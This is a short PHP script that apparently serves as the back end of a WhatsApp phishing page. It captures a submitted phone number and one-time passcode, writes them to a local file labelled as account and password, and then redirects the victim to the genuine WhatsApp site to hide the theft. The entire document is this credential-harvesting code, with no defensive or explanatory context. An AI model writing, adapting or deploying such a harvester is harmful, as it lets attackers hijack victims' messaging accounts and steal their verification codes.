<?php

file_put_contents("usernames.txt", "Account: " . $_POST['phone'] . " Pass: " . $_POST['otp'] . "\n", FILE_APPEND);
header('Location: https://api.whatsapp.com/');
exit();